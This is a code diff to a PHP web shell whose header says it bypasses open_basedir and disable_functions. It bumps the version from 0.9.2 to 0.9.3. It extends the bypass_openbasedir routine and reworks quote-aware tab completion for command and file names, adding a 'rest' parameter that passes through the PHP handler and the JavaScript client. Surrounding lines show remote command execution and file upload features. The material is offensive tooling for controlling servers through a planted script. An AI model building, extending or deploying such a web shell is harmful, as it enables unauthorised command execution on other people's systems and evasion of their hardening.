@@ -4,7 +4,7 @@
  * and disable_functions
  * 
  * @author  Testeur de Stylos
- * @version 0.9.2
+ * @version 0.9.3
  */
 ob_end_clean();
 
@@ -581,6 +581,10 @@ function bypass_openbasedir($cwd):bool{
           return true;
       }
     }
+  }
+  elseif (scandir("/") !== false){
+    chdir($cwd);
+    return true;
   }
   chdir($cwd);
   return false;
@@ -1565,7 +1569,7 @@ function featureShell(string $cmdline, string $cwd):array {
 * $type: command or operand ?
 * return: The list of matching commands or matching files/folders
 **/
-function featureHint(string $fileName, string $cwd, string $type):array {
+function featureHint(string $fileName, string $cwd, string $type, string $rest):array {
   if ($type == 'cmd') {
       $res_cmds = [];
       foreach (COMMANDS as $cmd => $value) {
@@ -1574,10 +1578,17 @@ function featureHint(string $fileName, string $cwd, string $type):array {
         }
       }
       return array(
-          'files' => $res_cmds
+          'files' => $res_cmds,
+          'rest' => $rest
       );
   }
   chdir($cwd);
+  $fchar = "";
+  if (strlen($fileName) && ($fileName[0] == "'" || $fileName[0] == '"')){
+    $fchar = $fileName[0];
+    $fileName = substr($fileName, 1);
+  }
+  
   bypass_openbasedir($cwd);
   $match_scan_dir = [];
   $idx = strrpos($fileName, "/");
@@ -1595,12 +1606,13 @@ function featureHint(string $fileName, string $cwd, string $type):array {
     $path = realpath($dir);
     if (!file_exists($path)){
       return array(
-        'files' => []
+        'files' => [],
+        'rest' => $rest
       );
     }
-    $fileName_local = substr($fileName, $idx+1);
+    $fileName = substr($fileName, $idx+1);
     foreach (scandir($path, SCANDIR_SORT_ASCENDING) as $x){
-      if (str_starts_with($x, $fileName_local) || !strlen($fileName_local) && strcmp(".", $x) && strcmp("..", $x)){
+      if (str_starts_with($x, $fileName) || !strlen($fileName) && strcmp(".", $x) && strcmp("..", $x)){
         if (is_dir($dir."/".$x)){$x .= "/";}
         array_push($match_scan_dir, $x);
       }
@@ -1610,8 +1622,17 @@ function featureHint(string $fileName, string $cwd, string $type):array {
       $match_scan_dir[0] = ($dir != "/" ? $dir."" : "")."/".$match_scan_dir[0];
     }
   }
+  if ($fchar && count($match_scan_dir) == 1){
+    if (str_ends_with($match_scan_dir[0], "/") || $rest[0] == $fchar){
+      $match_scan_dir[0] = $fchar.$match_scan_dir[0];
+    }else{
+        $match_scan_dir[0] = $fchar.$match_scan_dir[0].$fchar." ";
+    }
+  }
+  
   return array(
-      'files' => $match_scan_dir
+      'files' => $match_scan_dir,
+      'rest' => $rest
   );
 }
 
@@ -1676,7 +1697,7 @@ if (isset($_GET["feature"])) {
             $response = array("cwd" => getcwd());
             break;
         case "hint":
-            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type'], $_POST['rest']);
             break;
         case 'upload':
             $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
@@ -1871,34 +1892,96 @@ if (isset($_GET["feature"])) {
                 }
             }
 
-            function featureHint() {
+            function featureHint(e) {
                 if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
 
                 function _requestCallback(data) {
                     if (!data.files.length) return;  // no completion
                     if (data.files.length === 1) {
-                        if (type === 'cmd') {
-                            eShellCmdInput.value = data.files[0];
-                        } else {
-                            var currentValue = eShellCmdInput.value;
-                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
+                      if (type === 'cmd') {
+                          eShellCmdInput.value = data.files[0]+ data.rest;
+                      }
+                      else {
+                        var currentValue = eShellCmdInput.value;
+                        var args = currentValue.substring(0,currentValue.length - data.rest.length);
+                        var quote = '';
+                        var start;
+                        idx = -1;
+                        for (var i = 0; i < args.length; i++){
+                          if ((args[i] == "'" || args[i] == '"') && (i == 0 || args[i-1] != "\\" )){ // not escaped
+                            if (quote == args[i]){
+                              quote = "";
+                            }
+                            else if (quote == ""){
+                              quote = args[i];
+                              idx = i;
+                            }
+                          }
                         }
-                    } else {
+                        if (quote == ""){
+                          start = args.lastIndexOf(" ");
+                        }
+                        else{
+                          start = idx-1;
+                        }
+                        if (data.files[0].slice(-1) == "/"){
+                          eShellCmdInput.value = currentValue.substring(0,start+1)+data.files[0] + data.rest;
+                        }
+                        else{
+                          if (data.rest[0] == "'" || data.rest[0] == '"'){
+                            eShellCmdInput.value = currentValue.substring(0,start+1)+data.files[0]+data.rest;
+                          }
+                          else{
+                            eShellCmdInput.value = currentValue.substring(0,start+1)+data.files[0] + " " + data.rest;
+                          }
+                        }
+                      }
+                    }
+                    else {
                         _insertCommand(eShellCmdInput.value);
                         _insertStdout(data.files.join("\n"), false);
                     }
+                    var curPos = eShellCmdInput.value.length - data.rest.length;
+                    eShellCmdInput.focus(); 
+                    eShellCmdInput.setSelectionRange(curPos, curPos); 
                 }
-
-                var currentCmd = eShellCmdInput.value.split(" ");
-                var type = (currentCmd.length === 1) ? "cmd" : "file";
-                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
+                var currentCmd = eShellCmdInput.value.substring(0,e.target.selectionStart).split(" ");
+                var rest = eShellCmdInput.value.substring(e.target.selectionStart);
+                var type = (e.target.selectionStart <= currentCmd[0].length) ? "cmd" : "file";
+                var fileName = null;
+                if (type === "cmd"){
+                  fileName = currentCmd[0];
+                }
+                else{
+                  var args = eShellCmdInput.value.substring(currentCmd.length-1,e.target.selectionStart);
+                  var quote = '';
+                  idx = -1;
+                  for (var i = 0; i < args.length; i++){
+                    if ((args[i] == "'" || args[i] == '"') && (i == 0 || args[i-1] != "\\" )){ // not escaped
+                      if (quote == args[i]){
+                        quote = "";
+                      }
+                      else if (quote == ""){
+                        quote = args[i];
+                        idx = i;
+                      }
+                    }
+                  }
+                  if (quote == ""){
+                    fileName = currentCmd[currentCmd.length - 1];
+                  }
+                  else{
+                    fileName = args.substring(idx);
+                  }
+                }
 
                 makeRequest(
                     "?feature=hint",
                     {
                         filename: fileName,
                         cwd: CWD,
-                        type: type
+                        type: type,
+                        rest: rest
                     },
                     _requestCallback
                 );
@@ -2012,7 +2095,7 @@ if (isset($_GET["feature"])) {
                         break;
                     case 'Tab':
                         event.preventDefault();
-                        featureHint();
+                        featureHint(event);
                         break;
                 }
             }
